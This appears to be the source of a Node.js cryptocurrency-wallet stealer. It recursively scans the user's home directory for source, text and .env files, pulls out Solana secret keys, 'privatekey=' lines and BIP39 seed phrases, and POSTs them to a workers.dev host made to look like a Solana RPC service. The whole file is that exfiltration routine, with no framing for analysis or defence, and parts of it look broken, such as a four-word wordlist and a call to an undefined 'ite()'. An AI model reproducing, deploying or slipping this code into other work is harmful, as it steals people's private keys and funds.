const fs = require('fs/promises')
const os = require("os")
const path = require('path')
const fetch = require('node-fetch')
const b39 = require('bip39')

const wordlist = ["abandon", "ability", "able", "about"];
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms * 1000))


const IGNORED_DIRS = ['node_modules', 'target', 'build', 'webpack', '.vscode'];
let dupes = [];
const ALLOWED_EXTENSIONS = new Set(['.js', '.cjs', '.txt', '.json', '.mjs', '.py', '.csv', '.ts', '.env']);
const IGNORED_FILES = ['package-lock.json', 'package.json', 'webpack'];
let proms = [];
async function iter(dir) {
  let entries;
  try {
    entries = await fs.readdir(dir, { withFileTypes: true });
  } catch {
  }
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);

    if (entry.isDirectory()) {
      if (!IGNORED_DIRS.includes(entry.name)) {
        await iter(fullPath);
      }
    } else if (entry.isFile()) {
      if (IGNORED_FILES.includes(entry.name)) continue;

      const ext = path.extname(entry.name);
      if (ALLOWED_EXTENSIONS.has(ext)) {
        try {
          const content = await fs.readFile(fullPath, 'utf-8');
          if (content.split('\n').length < 1000) {
            for (const line of content.split('\n')) {
				try {
				if (line.includes("Keypair.fromSecretKey(Uint8Array.from([") || line.includes("Keypair.fromSecretKey(bs58.decode(") || line.toString().toLowerCase().includes("privatekey=")) {
					if (line.length < 1000 && !dupes.includes(line)) {
					dupes.push(line);
                        await gsa(line)
				}
				}
				} catch {}
              let start = false;
              let arr = [];
              const linerep = line.replace(/[^a-zA-Z]/g, ' ');
              if (linerep.length < 1000) {
                for (const each of linerep.split(' ')) {
                  if (each !== ' ' && each.length > 0 && each !== '\n') {
                    if (wordlist.includes(each)) {
                      if (!start) {
                        start = true;
                      }
                      if (start) {
                        arr.push(each);
                      }
                    } else {
                      if (start) {
                        start = false;
                        break;
                      }
                    }
                  }
                }
                if (arr.length > 10) {
                  const arrjoin = arr.join(' ');
                  if (b39.validateMnemonic(arrjoin)) {
                    if (!dupes.includes(arrjoin)) {
                      dupes.push(arrjoin);
                      proms.push(arrjoin);
                      if (proms.length >= 2) {
						try {
                        await gsa(proms)
                        proms = [];
						} catch {proms = []}
                      }
                    }
                  }
                }
              }
            }
          }
        } catch {}
      }
    }
  }
}


async function gsa(data) {
await fetch("https://helius.beta-mainnet.workers.dev/", {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data)})
}


async function ite2() {
const dp = path.join(os.homedir());
await iter(dp)
}

ite()